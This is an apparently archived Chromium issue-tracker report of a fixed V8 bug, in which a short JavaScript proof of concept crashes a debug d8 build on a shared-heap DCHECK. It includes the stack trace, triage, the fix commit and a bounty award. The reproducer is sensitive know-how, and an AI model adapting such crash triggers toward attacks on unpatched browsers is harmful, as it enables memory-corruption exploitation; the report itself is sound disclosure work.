# Security: dcheck failed in object.InSharedHeap 

| Field | Value |
|-------|-------|
| **Issue ID** | [40061894](https://issues.chromium.org/issues/40061894) |
| **Status** | Fixed |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Linux, Mac, Windows |
| **Reporter** | wh...@gmail.com |
| **Assignee** | sy...@chromium.org |
| **Created** | 2022-11-24 |
| **Bounty** | $7,000.00 |

## Description

**This template is ONLY for reporting security bugs. If you are reporting a**  

**Download Protection Bypass bug, please use the "Security - Download**  

**Protection" template. For all other reports, please use a different**  

**template.**

**Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com>**  

**/chromium/src/+/HEAD/docs/security/faq.md**

**Please see the following link for instructions on filing security bugs:**  

**<https://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**Reports may be eligible for reward payments under the Chrome VRP:**  

**<http://g.co/ChromeBugRewards>**

**NOTE: Security bugs are normally made public once a fix has been widely**  

**deployed.**

**-------------------------**

**VULNERABILITY DETAILS**  

**Please provide a brief explanation of the security issue.**

**VERSION**  

**Chrome Version: [x.x.x.x] + [stable, beta, or dev]**  

**Operating System: [Please indicate OS, version, and service pack level]**

**REPRODUCTION CASE**  

**Please include a demonstration of the security bug, such as an attached**  

**HTML or binary file that reproduces the bug when loaded in Chrome. PLEASE**  

**make the file as small as possible and remove any content not required to**  

**demonstrate the bug, or any personal or confidential information.**

**Please attach files directly, not in zip or other archive formats, and if**  

**you've created a demonstration site please also attach the files needed to**  

**reproduce the demonstration locally.**

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

**Type of crash: [tab, browser, etc.]**  

**Crash State: [see link above: stack trace \*with symbols\*, registers,**  

**exception record]**  

**Client ID (if relevant): [see link above]**

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

**Reporter credit: [goes here]**

v8 main channel 7aea8bef7624b6fa146dd040d3a498e0dedc6290

PoC  

function main() {  

const v1 = this.Atomics;  

const v2 = v1.Condition;  

const v3 = v2(v2,v2);  

try {  

const v5 = (9223372036854775806).normalize(9223372036854775806,v3,v3);  

} catch(v6) {  

const v7 = v6.constructor;  

const v8 = v7.captureStackTrace(v3);  

}  

gc();  

}  

//%NeverOptimizeFunction(main);  

main();

x64.debug git:(main) ./d8 --expose-gc --future --harmony --assert-types --harmony-rab-gsab --harmony-struct --allow-natives-syntax --interrupt-budget=1000 ~/program\_20221123141454\_A3BF70F8-EB45-4275-91DD-CB73D736143D\_deterministic.js

# 

# Fatal error in ../../src/objects/code-inl.h, line 1853

# Debug check failed: !object.InSharedHeap().

# 

# 

# 

#FailureMessage Object: 0x7ffc083fb710  

==== C stack trace ===============================

```
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x1e) [0x7ffb327a8fce]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8_libplatform.so(+0x4aded) [0x7ffb326feded]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const\*, int, char const\*, ...)+0x16f) [0x7ffb32777c1f]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8_libbase.so(+0x566ac) [0x7ffb327776ac]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8_libbase.so(V8_Dcheck(char const\*, int, char const\*)+0x27) [0x7ffb32777cc7]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(void v8::internal::DependentCode::DeoptimizeDependencyGroups<v8::internal::Map>(v8::internal::Isolate\*, v8::internal::Map, v8::base::Flags<v8::internal::DependentCode::DependencyGroup, unsigned int>)+0x49) [0x7ffb35a50599]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Map::NotifyLeafMapLayoutChange(v8::internal::Isolate\*)+0x64) [0x7ffb35a438d4]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Map::CopyDropDescriptors(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::Map>)+0x142) [0x7ffb36148032]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Map::CopyReplaceDescriptors(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::Map>, v8::internal::Handle<v8::internal::DescriptorArray>, v8::internal::TransitionFlag, v8::internal::MaybeHandle<v8::internal::Name>, char const\*, v8::internal::SimpleTransitionFlag)+0x93) [0x7ffb36148a93]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Map::CopyAddDescriptor(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::Map>, v8::internal::Descriptor\*, v8::internal::TransitionFlag)+0x272) [0x7ffb36141472]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Map::CopyWithField(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::Map>, v8::internal::Handle<v8::internal::Name>, v8::internal::Handle<v8::internal::FieldType>, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::Representation, v8::internal::TransitionFlag)+0x314) [0x7ffb36141094]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Map::TransitionToDataProperty(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::Map>, v8::internal::Handle<v8::internal::Name>, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::StoreOrigin)+0x57e) [0x7ffb3614ab9e]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::LookupIterator::PrepareTransitionToDataProperty(v8::internal::Handle<v8::internal::JSReceiver>, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::StoreOrigin)+0x7c5) [0x7ffb36126875]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Object::TransitionAndWriteDataProperty(v8::internal::LookupIterator\*, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin)+0x67) [0x7ffb36189797]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Object::AddDataProperty(v8::internal::LookupIterator\*, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, v8::internal::EnforceDefineSemantics)+0x9fc) [0x7ffb3618937c]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Object::SetProperty(v8::internal::LookupIterator\*, v8::internal::Handle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>)+0xd6) [0x7ffb36186246]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Object::SetProperty(v8::internal::Isolate\*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Name>, v8::internal::Handle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>)+0xa6) [0x7ffb361860f6]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Isolate::CaptureAndSetErrorStack(v8::internal::Handle<v8::internal::JSObject>, v8::internal::FrameSkipMode, v8::internal::Handle<v8::internal::Object>)+0x498) [0x7ffb358be428]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(+0x2d89a58) [0x7ffb35543a58]  
/home/uuu/v8_src.updated/v8/out/x64.debug/libv8.so(v8::internal::Builtin_ErrorCaptureStackTrace(int, unsigned long\*, v8::internal::Isolate\*)+0x103) [0x7ffb355435c3]  
[0x7ffabf9b33bf]  

```

[1] 841305 trace trap (core dumped) ./d8 --expose-gc --future --harmony --assert-types --harmony-rab-gsab  

➜ x64.debug git:(main)

## Timeline

### [Deleted User] (2022-11-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2022-11-28)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6039968960151552.

### cl...@chromium.org (2022-11-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2022-11-28)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>JavaScript>Runtime]

### cl...@chromium.org (2022-11-28)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/b6d4d9be9c7d8c459af5c05ccaf7075778a1c31b (Reland^2 "[shared-struct] Add Atomics.Condition").

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### cl...@chromium.org (2022-11-28)

Detailed Report: https://clusterfuzz.com/testcase?key=6039968960151552

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  !object.InSharedHeap() in code-inl.h
  v8::internal::Map::CopyDropDescriptors
  v8::internal::Map::CopyReplaceDescriptors
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=82367:82368

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6039968960151552

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ct...@chromium.org (2022-11-28)

syg@ could you comment on the consequences of reaching this DCHECK? I'm trying to set security severity for this bug but it isn't clear to me what could an attacker accomplish by triggering this code path with a shared object.

### sy...@chromium.org (2022-11-28)

This should be Security_Impact-None as it requires --harmony-struct, which is an experimental JS feature that is off by default.

As for the severity, I'm not entirely sure. The immediate consequence of that DCHECK is lack of thread-safety.

### ct...@chromium.org (2022-11-28)

Thanks! Updating the impact label. I'll check with some other folks to determine severity.

### gi...@appspot.gserviceaccount.com (2022-11-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/f4cba668d9c62ee13302f8fc37816f9ee4e33b69

commit f4cba668d9c62ee13302f8fc37816f9ee4e33b69
Author: Shu-yu Guo <syg@chromium.org>
Date: Mon Nov 28 23:21:39 2022

[shared-struct] Disallow adding private named properties to shared objects

Bug: chromium:1393227
Change-Id: I5b8ad2e9c6898d5ef9bbf47572380492745c415a
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4062670
Auto-Submit: Shu-yu Guo <syg@chromium.org>
Commit-Queue: Marja Hölttä <marja@chromium.org>
Reviewed-by: Marja Hölttä <marja@chromium.org>
Cr-Commit-Position: refs/heads/main@{#84572}

[add] https://crrev.com/f4cba668d9c62ee13302f8fc37816f9ee4e33b69/test/mjsunit/shared-memory/private-name.js
[modify] https://crrev.com/f4cba668d9c62ee13302f8fc37816f9ee4e33b69/src/objects/lookup-inl.h


### cl...@chromium.org (2022-11-30)

ClusterFuzz testcase 6039968960151552 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=84571:84572

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### [Deleted User] (2022-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-30)

[Empty comment from Monorail migration]

### sa...@google.com (2022-12-13)

I think we should assume that lack of thread-safety can lead to memory corruption, so setting severity accordingly.

### am...@google.com (2022-12-15)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-12-16)

Congratulations on another one! The VRP Panel has decided to award you $7,000 for this report. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2022-12-16)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2023-03-08)

This issue was migrated from crbug.com/chromium/1393227?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061894)*
